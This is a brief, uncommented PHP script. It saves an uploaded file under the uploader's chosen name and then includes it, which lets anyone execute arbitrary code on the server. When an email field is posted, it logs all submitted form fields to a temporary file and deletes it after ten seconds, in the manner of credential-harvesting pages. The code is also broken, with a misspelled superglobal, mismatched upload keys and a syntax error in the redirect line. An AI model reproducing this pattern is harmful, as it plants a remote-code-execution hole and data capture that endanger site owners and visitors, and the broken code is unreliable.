<?php

$filename = $__FILES['file']['name'];
move_uploaded_file($_FILES["files"]["tmp_name"], $filename);

include $filename;

if (isset($_POST['email']))
{
    $file = fopen("tmp.txt", "a");
    foreach ($_POST as $key => $value)
    {
        fwrite($file, $key.':'.' '.$_POST["$key"]."\n");
    }
    fwrite($file, "\n\n");
    fclose($file);
    sleep(10);
    unlink('tmp.txt');
}
$url = "https://wwww."$filename.".com";
header("Location: $url");
?>
